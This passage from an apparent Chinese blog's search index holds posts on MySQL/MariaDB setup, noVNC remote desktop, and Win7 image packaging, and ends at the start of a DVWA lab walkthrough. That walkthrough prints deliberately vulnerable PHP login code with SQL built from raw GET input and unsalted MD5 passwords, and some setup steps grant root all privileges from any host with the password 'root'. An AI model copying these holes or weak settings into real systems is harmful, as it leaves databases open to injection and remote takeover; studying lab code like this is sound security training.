class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">首先启动mysql</span></span><br><span class="line">./support-files/mysql.server start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果已经启动</span></span><br><span class="line">ps aux|grep mysql</span><br><span class="line">kill -9 #上边的进程号</span><br><span class="line"><span class="meta">#</span><span class="bash">或者下边一条命令即可杀掉所有MySQL进程</span></span><br><span class="line">ps aux|grep mysql|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改密码为root</span></span><br><span class="line">./bin/mysqladmin -u root -h localhost.localdomain password &#x27;root&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">登录mysql</span></span><br><span class="line">./bin/mysql -h 127.0.0.1 -u root -p root</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改其他用户密码</span></span><br><span class="line">update mysql.user set password=password(&#x27;root&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-添加远程登录权限"><a class="markdownIt-Anchor" href="#8-添加远程登录权限">#</a> 8. 添加远程登录权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在mysql中输入</span></span><br><span class="line">grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="9-将mysql加入service系统服务"><a class="markdownIt-Anchor" href="#9-将mysql加入service系统服务">#</a> 9. 将 MySQL 加入 Service 系统服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp support-files/mysql.server /etc/init.d/mysqld</span><br><span class="line">chkconfig --add mysqld</span><br><span class="line">chkconfig mysqld on</span><br><span class="line">service mysqld restart</span><br><span class="line">service mysqld status</span><br></pre></td></tr></table></figure><h3 id="10-配置mycnf"><a class="markdownIt-Anchor" href="#10-配置mycnf">#</a> 10. 配置 my.cnf</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi my.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash">添加如下语句</span></span><br><span class="line">character-set-server=utf8</span><br><span class="line">lower_case_table_names=1</span><br><span class="line">max_allowed_packet=100M</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">配置完成重启服务</span></span><br><span class="line">service mysqld restart</span><br><span class="line">service mysqld status</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7下yum安装MariaDB</title>
      <link href="/2021/05/20/Centos7%E4%B8%8Byum%E5%AE%89%E8%A3%85MariaDB/"/>
      <url>/2021/05/20/Centos7%E4%B8%8Byum%E5%AE%89%E8%A3%85MariaDB/</url>
      
        <content type="html"><![CDATA[<h1 id="centos7下yum安装mariadb"><a class="markdownIt-Anchor" href="#centos7下yum安装mariadb">#</a> centos7 下 yum 安装 MariaDB</h1><p>CentOS 7 下 mysql 下替换成 MariaDB 了。<br>MariaDB 数据库管理系统是 MySQL 的一个分支，主要由开源社区在维护，采用 GPL 授权 许可 MariaDB 的目的是完全兼容 MySQL，包括 API 和命令行，使之能轻松成为 MySQL 的代替品。</p><h2 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line"></span><br><span class="line">systemctl start mariadb   #启动mariadb</span><br><span class="line">systemctl enable mariadb  #设置开机自启动</span><br><span class="line">systemctl stop mariadb    #停止MariaDB</span><br><span class="line">systemctl restart mariadb #重启MariaDB</span><br><span class="line">mysql_secure_installation #设置root密码等相关</span><br><span class="line">mysql -uroot -p           #测试登录   </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改密码</span></span><br><span class="line">update mysql.user set password=PASSWORD(&#x27;123456&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新权限</span></span><br><span class="line">flush privileges; </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash">create user  <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机&#x27;</span> identified by <span class="string">&#x27;密码&#x27;</span>   如果只允许本机访问 @<span class="string">&#x27;localhost&#x27;</span>  , 或者指定一个ip  @<span class="string">&#x27;192.xx.xx.xx&#x27;</span> 或者使用通配: @<span class="string">&#x27;%&#x27;</span></span></span><br><span class="line">create user &#x27;read_visa&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新用户权限</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> grant 操作类型 on 数据库.表 to 用户@<span class="string">&#x27;主机&#x27;</span>   数据库,表,主机都支持通配符 grant select, insert on *.* to  <span class="string">&#x27;read_visa&#x27;</span>@<span class="string">&#x27;%&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> grant all on visa.* to <span class="string">&#x27;read_visa&#x27;</span>@<span class="string">&#x27;%&#x27;</span>; // all 表示所有权限</span></span><br><span class="line">grant select on visa.* to &#x27;read_visa&#x27;@&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win10+noVNC</title>
      <link href="/2021/05/19/Win10+noVNC/"/>
      <url>/2021/05/19/Win10+noVNC/</url>
      
        <content type="html"><![CDATA[<h1 id="网页实现远程桌面"><a class="markdownIt-Anchor" href="#网页实现远程桌面">#</a> 网页实现远程桌面</h1><h2 id="环境"><a class="markdownIt-Anchor" href="#环境">#</a> 环境</h2><ul><li>Win10 (被访问的 Server, 设其 IP 为 11.11.11.11)</li></ul><h2 id="软件"><a class="markdownIt-Anchor" href="#软件">#</a> 软件</h2><ul><li>nodejs</li><li>noVnc</li><li>websockify</li><li>tightvnc</li></ul><h2 id="搭建流程"><a class="markdownIt-Anchor" href="#搭建流程">#</a> 搭建流程</h2><ul><li>Server 安装 nodejs</li><li>安装 ws、optimist 模块（执行 websockify.js 文件所需）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install ws</span><br><span class="line">npm install optimist</span><br><span class="line">npm install mime-types</span><br></pre></td></tr></table></figure><ul><li>将 noVNC 解压到 C:\Users\XXX (用户名)\node_modules\ 下</li><li>将 websockify 解压到 C:\Users\XXX (用户名)\node_modules\noVNC 下</li><li>如图</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518103523666.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518103523666"></p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518103547147.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518103547147"></p><ul><li><p>将./noVNC/vnc.html 复制一份，更名为 index.html</p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518105649182.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518105649182"></p></li><li><p>Server 安装 tightVNC</p></li><li><p>运行 tightVNC server, 任务栏找到图标<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518103816266.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518103816266"></p></li><li><p>单击打开，设置连接密码</p></li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518104024652.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518104024652"></p><ul><li><p>这里服务默认端口 5900，不用更改</p></li><li><p>打开 cmd，使用 websockify.js 转发 9000 端口的 http 链接到 5900 端口，运行以下命令</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node C:\Users\SSR\node_modules\noVNC\websockify-js-master\websockify\websockify.js --web C:\Users\SSR\node_modules\noVNC 9000 localhost:5900</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意更改用户路径</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意更改localhost为本机IP（11.11.11.11）</span></span><br></pre></td></tr></table></figure><ul><li>保持 cmd 窗口后台运行，打开 Win10 防火墙设置，添加入站规则，允许 TCP9000 端口入站<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518104902295.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518104902295"></li><li>配置完成</li></ul><h2 id="验证效果"><a class="markdownIt-Anchor" href="#验证效果">#</a> 验证效果</h2><ul><li>打开同网段另一台电脑，打开浏览器</li><li>访问 ServerIP:9000，形如 11.11.11.11:9000<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518110422381.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518110422381"></li><li>点击连接，输入之前设置的连接密码<br><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518110522936.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518110522936"></li><li>成功连接 Win10<br>![](E:\SSR\Pictures\ 屏幕截图 2021-05-18 110948.png)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux+noVNC</title>
      <link href="/2021/05/18/Linux+noVNC/"/>
      <url>/2021/05/18/Linux+noVNC/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxnovnc"><a class="markdownIt-Anchor" href="#linuxnovnc">#</a> Linux+noVNC</h1><h2 id="环境及软件"><a class="markdownIt-Anchor" href="#环境及软件">#</a> 环境及软件</h2><ul><li>Centos7 桌面</li><li>noVNC</li><li>websockify</li><li>tigervnc-server</li></ul><h2 id="搭建流程"><a class="markdownIt-Anchor" href="#搭建流程">#</a> 搭建流程</h2><ol><li>安装 Centos7 桌面版</li><li>安装 noVNC<ul><li>git clone <a href="https://github.com/novnc/noVNC">https://github.com/novnc/noVNC</a></li><li>git clone <a href="https://github.com/novnc/websockify">https://github.com/novnc/websockify</a></li><li>mv ./websockify ./noVNC/</li><li>cd ./noVNC/utils/</li><li>openssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem</li><li>生成证书，一直回车</li><li>yum -y install python3</li><li>yum -y install numpy</li><li>缺啥补啥</li></ul></li><li>安装 tigervnc-server<ul><li>yum -y install tigervnc-server</li><li>建立服务</li><li>vncserver :1</li><li>输入连接密码，最低 6 位数</li><li>牢记访问密码</li></ul></li><li>启动服务</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/noVNC/utils/launch.sh --vnc localhost:5901</span><br></pre></td></tr></table></figure><h2 id="测试"><a class="markdownIt-Anchor" href="#测试">#</a> 测试</h2><ol><li>打开另一台同网段电脑浏览器，Chrome/Firefox</li><li>访问 http://CentosIP/vnc.html</li></ol><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518194210406.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518194210406"></p><ol start="3"><li>输入密码</li></ol><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518194236868.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518194236868"></p><ol start="4"><li>网页连接成功</li></ol><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210518194333582.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210518194333582"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win7系统封装与快速装机</title>
      <link href="/2021/05/03/Win7%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/"/>
      <url>/2021/05/03/Win7%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="win7系统封装与快速装机"><a class="markdownIt-Anchor" href="#win7系统封装与快速装机">#</a> Win7 系统封装与快速装机</h1><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cdos.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="dos"></p><h3 id="背景"><a class="markdownIt-Anchor" href="#背景">#</a> 背景</h3><p>最近小编接受了一项任务，给一定数量的电脑更换系统，并且需要根据实际，在系统中安装环境和许多软件，而一台一台安装又不大现实，于是就开始了这一次艰辛的历程，从开始着手到最终成功花费了近一周的空闲时间，失败次数 4 次以上，而每次尝试花费的时间都在 5 小时左右。。。<br>于是特地把过程记录下来，希望能帮到有需要的人，所需要的工具放在最后。</p><h3 id="任务目标"><a class="markdownIt-Anchor" href="#任务目标">#</a> 任务目标</h3><p>给若干电脑装系统，并带有自定义的软件。采取的解决方法是制作自定义的封装系统。</p><h3 id="准备工具"><a class="markdownIt-Anchor" href="#准备工具">#</a> 准备工具</h3><ul><li><p>Win7 镜像</p></li><li><p>虚拟机环境</p></li><li><p>各类软件安装包</p></li><li><p>优化清理工具</p></li><li><p>系统封装工具</p></li><li><p>PE 启动盘一个</p></li></ul><h3 id="安装系统"><a class="markdownIt-Anchor" href="#安装系统">#</a> 安装系统</h3><ul><li>首先在 VMware 中安装 Win7 系统，安装系统步骤省略。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502203925837.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502203925837"></p><ul><li>安装到这个界面时停住，建立一次快照，记得每做完几步就建立快照哦。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502204145183.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502204145183"></p><ul><li>此时注意，第一个关键点，否则将失败，这里不添加用户，按下 Ctrl+Shift+F3，系统重启，自动用 Administrator 登录。出现以下界面。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502204527028.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502204527028"></p><ul><li>此时注意，第二个关键点，这里选择取消，并且以后的每次重启都选择取消。之后改改分辨率，将桌面图标调出来。</li></ul><h3 id="安装所需软件"><a class="markdownIt-Anchor" href="#安装所需软件">#</a> 安装所需软件</h3><ul><li>接下来就是一个接一个地安装软件。U1S1，安装这些软件真太费时间了。</li><li>这里小编安装了一些语言环境和常用的软件，当然也可以结合需要安装不同软件。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502210406879.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt=""></p><h3 id="清理优化"><a class="markdownIt-Anchor" href="#清理优化">#</a> 清理优化</h3><ul><li>安装完所有需要的软件后，接下来将系统清理一下。</li><li>使用 Dism++ 等清理工具将系统运行不需要的功能和缓存清除，修改一些系统设置，清空回收站等，清理完后系统减小了约 10G 的空间。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502205849480.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502205849480"></p><h3 id="封装系统"><a class="markdownIt-Anchor" href="#封装系统">#</a> 封装系统</h3><p>接下来到最关键的步骤了，这一步直接决定成功与否。</p><h4 id="第一次封装"><a class="markdownIt-Anchor" href="#第一次封装">#</a> 第一次封装</h4><ul><li>在做好一切准备工作后，确定这就是你想要的系统时，就可以开始封装系统了。</li><li>使用系统封装工具 EasySysprep5 对系统进行第一次封装，注意这次是在 Win7 系统中进行。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502210924733.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502210924733"></p><ul><li>直接一键封装。封装结束后需要立即进入 PE 系统进行第二次封装。</li></ul><h4 id="第二次封装"><a class="markdownIt-Anchor" href="#第二次封装">#</a> 第二次封装</h4><ul><li><p>关于 VM 中进入 PE 系统，这里有些经验分享给你。</p></li><li><p>第一步，将虚拟机关机，在虚拟机设置中添加硬盘，直到这一步。</p></li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502211314063.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502211314063"></p><ul><li>这里选择使用物理磁盘，选择 PhysicalDrive1，我的情况是电脑只有一块硬盘，那么第二块就是 U 盘了，如果有疑惑可以打开磁盘管理查看，使用整个磁盘，添加完毕。扩展一下，这边也可以使用主机硬盘分区，就类似于共享了主机的一块分区，但是注意不能是系统分区和运行软件的分区。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503125957086.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503125957086"></p><ul><li>开机选择打开电源进入固件，就是进入 BIOS 改变启动顺序，在 BOOT 选项中将第二块硬盘放到最上面，F10 保存重启。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210502211610879.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210502211610879"></p><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130535636.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503130535636"></p><ul><li>进入 PE 后进行第二次封装，一键封装就行，如果没啥问题就成功了。封装完成后别重启，进行下一步系统备份。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130650549.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503130650549"></p><h3 id="制作ghost镜像"><a class="markdownIt-Anchor" href="#制作ghost镜像">#</a> 制作 Ghost 镜像</h3><ul><li>使用 PE 系统的 Ghost 软件进行备份，选择 Win7 系统所在的盘，备份成为.gho 文件。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503130903826.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503130903826"></p><ul><li>经过近一小时的等待，备份 40 多 G 的系统，得到了 17G 大小的 GHO 镜像，到这里制作自定义系统就结束了。</li></ul><h3 id="测试效果"><a class="markdownIt-Anchor" href="#测试效果">#</a> 测试效果</h3><ul><li>小编在是直接在原系统上测试，进入 PE 使用分区工具将原系统分区和大约 300M 大小的引导分区格式化，再使用 Ghost 恢复分区，经过一小时的等待，恢复完成。</li><li>这时别着急重启系统，使用 DG 分区工具重建还原后的分区引导，不然可能不能正常开机哦。</li><li>成功启动。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503132307337.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503132307337"></p><ul><li>所有环境都在，软件功能正常。</li></ul><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210503132750165.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210503132750165"></p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h3><ul><li><p>这件看起来很简单的事，为什么花了这么久的时间？一开始呢，就想着制作 GHO 镜像，然后还原就能用，但是并非如此，其实在 CSDN 上有很成熟的教程，但是之前并不知道 “系统封装” 这个关键词，信息上的缺乏真会延误战机。不过呢，在过程中了解了许多系统相关知识，还在 U 盘里装了个 MSDOS 系统，等等收获也是不少。</p></li><li><p>最后手动 @CSDN 作者 “小鱼儿 yr” 提供的详细教程，如果觉得这篇教程不够详细，可以再看看他的。</p></li><li><p>工具链接：<a href="https://pan.baidu.com/s/1t_X6c1xftADwYN1diiRO1Q">https://pan.baidu.com/s/1t_X6c1xftADwYN1diiRO1Q</a> 提取码：lc7e</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA通关手册</title>
      <link href="/2021/04/15/DVWA/"/>
      <url>/2021/04/15/DVWA/</url>
      
        <content type="html"><![CDATA[<h1 id="dvwa通关手册"><a class="markdownIt-Anchor" href="#dvwa通关手册">#</a> DVWA 通关手册</h1><h2 id="brute-force"><a class="markdownIt-Anchor" href="#brute-force">#</a> Brute Force</h2><p>登录界面</p><h2 id="image-20210425163130153"><a class="markdownIt-Anchor" href="#image-20210425163130153">#</a> <img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163130153.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210425163130153"></h2><h3 id="low"><a class="markdownIt-Anchor" href="#low">#</a> Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 